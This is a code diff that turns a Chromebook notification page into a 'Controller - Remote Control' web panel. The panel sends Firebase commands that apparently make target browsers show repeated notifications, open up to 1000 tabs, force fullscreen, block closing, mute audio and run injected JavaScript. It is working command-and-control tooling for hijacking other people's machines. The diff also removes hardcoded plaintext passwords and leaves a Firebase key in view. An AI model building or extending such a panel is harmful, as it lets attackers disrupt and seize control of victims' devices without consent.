@@ -3,215 +3,113 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Login & Notify</title>
+<title>Controller - Remote Control</title>
 <style>
-  :root {
-    --blue: #1a73e8;
-    --bg-light: #f8f9fa;
-    --text-light: #202124;
-    --bg-dark: #202124;
-    --text-dark: #e8eaed;
-    --card-bg-light: white;
-    --card-bg-dark: #303134;
-    --input-bg-light: white;
-    --input-bg-dark: #3c4043;
-    --input-border-light: #ccc;
-    --input-border-dark: #5f6368;
-  }
   body {
-    background-color: var(--bg-light);
-    color: var(--text-light);
-    font-family: 'Segoe UI', Roboto, sans-serif;
-    margin: 0; 
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    transition: background-color 0.3s ease, color 0.3s ease;
+    font-family: Arial, sans-serif;
+    background: #1a1a1a;
+    color: #eee;
+    margin: 0; padding: 0;
   }
-  body.dark {
-    background-color: var(--bg-dark);
-    color: var(--text-dark);
-  }
-  .card {
-    background: var(--card-bg-light);
-    border-radius: 16px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-    padding: 2rem;
-    width: 100%;
-    max-width: 400px;
-    box-sizing: border-box;
-    transition: background-color 0.3s ease;
+  header {
+    background: #0055ff;
+    padding: 1rem;
     text-align: center;
   }
-  body.dark .card {
-    background: var(--card-bg-dark);
-    box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+  main {
+    max-width: 900px;
+    margin: 1rem auto;
+    padding: 1rem;
+    background: #222;
+    border-radius: 6px;
+  }
+  label, input, select, button, textarea {
+    display: block;
+    margin-bottom: 0.8rem;
+    width: 100%;
+    font-size: 1rem;
+  }
+  input, select, textarea {
+    padding: 0.4rem;
+    border-radius: 4px;
+    border: none;
+  }
+  button {
+    background: #007bff;
+    color: white;
+    border: none;
+    padding: 0.8rem;
+    cursor: pointer;
+    border-radius: 4px;
+    font-weight: bold;
+  }
+  button:hover {
+    background: #0056b3;
+  }
+  .section {
+    margin-bottom: 2rem;
   }
   h2 {
     margin-top: 0;
-    color: var(--blue);
-  }
-  label {
-    display: block;
-    margin: 1rem 0 0.5rem 0;
-    font-weight: 600;
-    text-align: left;
-  }
-  input, textarea {
-    width: 100%;
-    padding: 0.8rem;
-    border: 1px solid var(--input-border-light);
-    border-radius: 8px;
-    font-size: 1rem;
-    box-sizing: border-box;
-    resize: none;
-    background-color: var(--input-bg-light);
-    color: var(--text-light);
-    transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
-  }
-  body.dark input,
-  body.dark textarea {
-    background-color: var(--input-bg-dark);
-    border-color: var(--input-border-dark);
-    color: var(--text-dark);
-  }
-  button {
-    margin-top: 1.5rem;
-    width: 100%;
-    padding: 0.8rem;
-    font-size: 1rem;
-    background-color: var(--blue);
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background 0.2s ease;
-  }
-  button:hover {
-    background-color: #1664c1;
-  }
-  #status, #loginStatus {
-    margin-top: 1rem;
-    font-size: 0.95rem;
-    color: red;
-  }
-  .toggle-container {
-    display: flex;
-    justify-content: flex-end;
-    margin-bottom: 1rem;
-    user-select: none;
-  }
-  .switch {
-    position: relative;
-    display: inline-block;
-    width: 50px;
-    height: 26px;
-  }
-  .switch input { display: none; }
-  .slider {
-    position: absolute;
-    cursor: pointer;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background-color: #ccc;
-    border-radius: 34px;
-    transition: 0.4s;
-  }
-  .slider:before {
-    position: absolute;
-    content: "";
-    height: 20px;
-    width: 20px;
-    left: 3px;
-    bottom: 3px;
-    background-color: white;
-    border-radius: 50%;
-    transition: 0.4s;
-  }
-  input:checked + .slider {
-    background-color: var(--blue);
-  }
-  input:checked + .slider:before {
-    transform: translateX(24px);
-  }
-
-  /* Welcome loading */
-  #welcomeScreen {
-    position: fixed;
-    inset: 0;
-    background: var(--blue);
-    color: white;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    font-size: 1.5rem;
-    z-index: 9999;
-    user-select: none;
-  }
-  #welcomeScreen .loading-dots {
-    font-weight: 900;
-    font-size: 2rem;
-    margin-top: 1rem;
-    animation: blink 1.5s infinite;
-  }
-  @keyframes blink {
-    0%, 20% {opacity: 1;}
-    50% {opacity: 0;}
-    100% {opacity: 1;}
+    border-bottom: 1px solid #444;
+    padding-bottom: 0.3rem;
   }
 </style>
-<!-- Firebase App (the core Firebase SDK) -->
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<!-- Firebase Database (optional, only if you want to use Realtime Database) -->
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 </head>
 <body>
-
-<!-- Login Form -->
-<div id="loginCard" class="card">
-  <h2>Login</h2>
-  <label for="usernameInput">Username</label>
-  <input type="text" id="usernameInput" autocomplete="off" />
-  <label for="passwordInput">Password</label>
-  <input type="password" id="passwordInput" autocomplete="off" />
-  <button id="loginBtn">Sign In</button>
-  <div id="loginStatus"></div>
-
-  <div class="toggle-container" style="margin-top: 2rem;">
-    <label class="switch" title="Toggle dark mode">
-      <input type="checkbox" id="darkModeToggleLogin" />
-      <span class="slider"></span>
-    </label>
-  </div>
-</div>
-
-<!-- Welcome Screen -->
-<div id="welcomeScreen" style="display:none;">
-  <div>Welcome, <span id="welcomeUser"></span></div>
-  <div class="loading-dots">...</div>
-</div>
-
-<!-- Notification Sender -->
-<div id="notifyCard" class="card" style="display:none;">
-  <div class="toggle-container">
-    <label class="switch" title="Toggle dark mode">
-      <input type="checkbox" id="darkModeToggleNotify" />
-      <span class="slider"></span>
-    </label>
+<header>
+  <h1>Controller - Remote Control</h1>
+</header>
+<main>
+  <div class="section">
+    <h2>Send Notification</h2>
+    <label for="notifTitle">Title</label>
+    <input type="text" id="notifTitle" placeholder="Notification Title" />
+    <label for="notifMsg">Message</label>
+    <textarea id="notifMsg" rows="3" placeholder="Notification message"></textarea>
+    <label for="notifSound">Sound</label>
+    <select id="notifSound">
+      <option value="">None</option>
+      <option value="default">Default</option>
+      <option value="ding">Ding</option>
+      <option value="alert">Alert</option>
+    </select>
+    <label for="notifRepeat">Repeat Count</label>
+    <input type="number" id="notifRepeat" min="1" max="10" value="1" />
+    <label for="notifDelay">Delay Before (ms)</label>
+    <input type="number" id="notifDelay" min="0" value="0" />
+    <button id="sendNotifBtn">Send Notification</button>
   </div>
 
-  <h2>📢 Chromebook Notify</h2>
-  <label for="titleInput">Title</label>
-  <input type="text" id="titleInput" placeholder="e.g., Warning" autocomplete="off" />
-  <label for="messageInput">Message</label>
-  <textarea id="messageInput" rows="3" placeholder="e.g., Please plug in your charger." autocomplete="off"></textarea>
-  <button id="sendBtn">Send Notification</button>
-  <div id="status"></div>
-</div>
+  <div class="section">
+    <h2>Mass Tab Open</h2>
+    <label for="massTabUrl">URL to Open</label>
+    <input type="text" id="massTabUrl" placeholder="https://example.com" />
+    <label for="massTabCount">Number of Tabs</label>
+    <input type="number" id="massTabCount" min="1" max="1000" value="10" />
+    <label for="massTabDelay">Delay Between Opens (ms)</label>
+    <input type="number" id="massTabDelay" min="0" value="100" />
+    <label><input type="checkbox" id="massTabAutoClose" /> Auto Close Tabs After</label>
+    <input type="number" id="massTabAutoCloseTime" min="1" max="3600" value="60" placeholder="Seconds" />
+    <button id="sendMassTabBtn">Open Tabs</button>
+  </div>
+
+  <div class="section">
+    <h2>Advanced Commands</h2>
+    <label><input type="checkbox" id="advFullscreen" /> Force Fullscreen</label>
+    <label><input type="checkbox" id="advDisableClose" /> Disable Close</label>
+    <label><input type="checkbox" id="advMute" /> Mute Audio</label>
+    <label><input type="checkbox" id="advUnmute" /> Unmute Audio</label>
+    <label for="advInjectJS">Inject JavaScript (one line)</label>
+    <textarea id="advInjectJS" rows="3" placeholder="alert('Hello!');"></textarea>
+    <button id="sendAdvancedBtn">Send Advanced Command</button>
+  </div>
+</main>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
 <script>
-  // Firebase config and init
   const firebaseConfig = {
     apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
     authDomain: "notify-78da1.firebaseapp.com",
@@ -221,110 +119,86 @@
     messagingSenderId: "936289141781",
     appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
   };
+
   firebase.initializeApp(firebaseConfig);
-  // For Realtime Database, get a reference:
   const db = firebase.database();
 
-  // Built-in users with passwords and ranks
-  const users = {
-    "kvn": { password: "xahirlane241269638", rank: "owner" },
-    "frvvd": { password: "roman112", rank: "admin" }
-  };
-
-  const body = document.body;
-
-  // Dark mode toggle shared logic
-  function setupDarkMode(toggleId, targetBody) {
-    const toggle = document.getElementById(toggleId);
-    // Load saved preference
-    if(localStorage.getItem("darkMode") === "enabled") {
-      targetBody.classList.add("dark");
-      toggle.checked = true;
-    }
-    toggle.addEventListener("change", () => {
-      if(toggle.checked){
-        targetBody.classList.add("dark");
-        localStorage.setItem("darkMode", "enabled");
-      } else {
-        targetBody.classList.remove("dark");
-        localStorage.setItem("darkMode", "disabled");
-      }
-    });
+  function generateCommandId() {
+    return 'cmd_' + Math.random().toString(36).substr(2, 9);
   }
 
-  setupDarkMode("darkModeToggleLogin", body);
-  setupDarkMode("darkModeToggleNotify", body);
+  function sendCommand(data) {
+    const id = generateCommandId();
+    data.id = id;
+    data.timestamp = Date.now();
+    data.sender = "controller";
+    return db.ref('commands/' + id).set(data);
+  }
 
-  // Login functionality
-  const loginBtn = document.getElementById("loginBtn");
-  const loginStatus = document.getElementById("loginStatus");
-  const loginCard = document.getElementById("loginCard");
-  const welcomeScreen = document.getElementById("welcomeScreen");
-  const welcomeUser = document.getElementById("welcomeUser");
-  const notifyCard = document.getElementById("notifyCard");
-
-  loginBtn.addEventListener("click", () => {
-    const username = document.getElementById("usernameInput").value.trim();
-    const password = document.getElementById("passwordInput").value;
-
-    if (!username || !password) {
-      loginStatus.textContent = "⚠️ Enter username and password.";
-      return;
-    }
-
-    if (users[username] && users[username].password === password) {
-      // Clear status and inputs
-      loginStatus.textContent = "";
-      document.getElementById("usernameInput").value = "";
-      document.getElementById("passwordInput").value = "";
-
-      // Show welcome screen
-      welcomeUser.textContent = username;
-      loginCard.style.display = "none";
-      welcomeScreen.style.display = "flex";
-
-      // After 2.5 seconds, hide welcome & show notify UI
-      setTimeout(() => {
-        welcomeScreen.style.display = "none";
-        notifyCard.style.display = "block";
-      }, 2500);
-    } else {
-      loginStatus.textContent = "❌ Invalid login credentials.";
-    }
-  });
-
-  // Notification sender logic (now saves to Firebase Realtime Database)
-  const sendBtn = document.getElementById("sendBtn");
-  const status = document.getElementById("status");
-
-  sendBtn.addEventListener("click", () => {
-    const title = document.getElementById("titleInput").value.trim();
-    const message = document.getElementById("messageInput").value.trim();
-
+  document.getElementById('sendNotifBtn').onclick = () => {
+    const title = document.getElementById('notifTitle').value.trim();
+    const message = document.getElementById('notifMsg').value.trim();
     if (!title || !message) {
-      status.style.color = "red";
-      status.textContent = "⚠️ Please enter both a title and message.";
+      alert('Please enter both title and message');
       return;
     }
-
-    // Save notification to Firebase
-    const notification = {
+    const sound = document.getElementById('notifSound').value;
+    const repeat = parseInt(document.getElementById('notifRepeat').value) || 1;
+    const delay = parseInt(document.getElementById('notifDelay').value) || 0;
+    sendCommand({
+      type: 'notification',
       title,
       message,
-      timestamp: Date.now()
-    };
-    db.ref("notifications").push(notification)
-      .then(() => {
-        status.style.color = "green";
-        status.textContent = `✅ Notification sent:\nTitle: ${title}\nMessage: ${message}`;
-        document.getElementById("titleInput").value = "";
-        document.getElementById("messageInput").value = "";
-      })
-      .catch((error) => {
-        status.style.color = "red";
-        status.textContent = "❌ Error sending notification: " + error.message;
-      });
-  });
+      sound,
+      repeat,
+      scheduleDelay: delay
+    });
+    alert('Notification sent!');
+  };
+
+  document.getElementById('sendMassTabBtn').onclick = () => {
+    const url = document.getElementById('massTabUrl').value.trim();
+    const count = parseInt(document.getElementById('massTabCount').value);
+    const delay = parseInt(document.getElementById('massTabDelay').value);
+    const autoClose = document.getElementById('massTabAutoClose').checked;
+    const autoCloseTime = parseInt(document.getElementById('massTabAutoCloseTime').value) || 60;
+    if (!url || !count || count < 1) {
+      alert('Valid URL and count required!');
+      return;
+    }
+    sendCommand({
+      type: 'massTabOpen',
+      url,
+      count,
+      delay,
+      autoClose,
+      autoCloseTime
+    });
+    alert('Mass tab open command sent!');
+  };
+
+  document.getElementById('sendAdvancedBtn').onclick = () => {
+    const forceFullscreen = document.getElementById('advFullscreen').checked;
+    const disableClose = document.getElementById('advDisableClose').checked;
+    const muteAudio = document.getElementById('advMute').checked;
+    const unmuteAudio = document.getElementById('advUnmute').checked;
+    const injectJS = document.getElementById('advInjectJS').value.trim();
+
+    if (!forceFullscreen && !disableClose && !muteAudio && !unmuteAudio && !injectJS) {
+      alert('Please select or enter at least one advanced command');
+      return;
+    }
+
+    sendCommand({
+      type: 'advanced',
+      forceFullscreen,
+      disableClose,
+      muteAudio,
+      unmuteAudio,
+      injectJS
+    });
+    alert('Advanced command sent!');
+  };
 </script>
 </body>
 </html>
